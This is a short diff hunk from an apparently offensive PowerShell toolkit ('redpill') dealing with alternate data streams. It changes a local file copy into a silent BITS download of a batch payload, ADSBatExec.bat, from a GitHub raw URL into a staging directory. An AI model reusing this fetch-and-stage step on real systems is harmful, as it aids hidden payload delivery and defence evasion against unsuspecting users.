@@ -230,8 +230,8 @@ If($ADS -ieq "Enum"){
         Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
 
         ## TODO: Replace next cmdline by bits-transfer download cmdline
-        Copy-Item "$Env:USERPROFILE\coding\pswork\redpill\bypass\ADSBatExec.bat" "$StartDir\ADSBatExec.bat" -Force
-        # Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/master/bypass/ADSBatExec.bat -Destination $StartDir\ADSBatExec.bat -EA SilentlyContinue|Out-Null
+        # Copy-Item "$Env:USERPROFILE\coding\pswork\redpill\bypass\ADSBatExec.bat" "$StartDir\ADSBatExec.bat" -Force
+        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/ADSBatExec.bat -Destination $StartDir\ADSBatExec.bat -EA SilentlyContinue|Out-Null
 
         If(-not(Test-Path -Path "$StartDir\ADSBatExec.bat" -EA SilentlyContinue)){
             echo "[error] Not found: $StartDir\ADSBatExec.bat`n`n" > $Env:TMP\kbfdjk.log
